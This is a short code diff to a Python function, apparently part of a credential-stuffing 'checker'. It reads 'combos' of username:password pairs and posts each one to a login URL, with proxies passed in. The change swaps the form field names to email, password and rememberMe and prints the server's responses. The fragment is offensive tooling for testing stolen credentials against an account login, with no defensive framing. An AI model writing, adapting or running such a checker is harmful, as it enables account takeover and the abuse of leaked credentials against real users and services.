@@ -89,13 +89,15 @@ def Checker(combos, proxys):
         for account in r:
             account = account.replace("\n", "")
             a = account.split(":")
+            print(a)
             user = a[0]
             pwd = a[1]
             payload = {
-                    "login[username]": user,
-                    "login[pasword]": pwd
+                    "email": user,
+                    "password": pwd,
+                    "rememberMe":"false"
                     }
             with requests.Session() as s2:
                 p = s2.post(urls[2], data=payload)
-                print(p)
+                print(p.text)
 
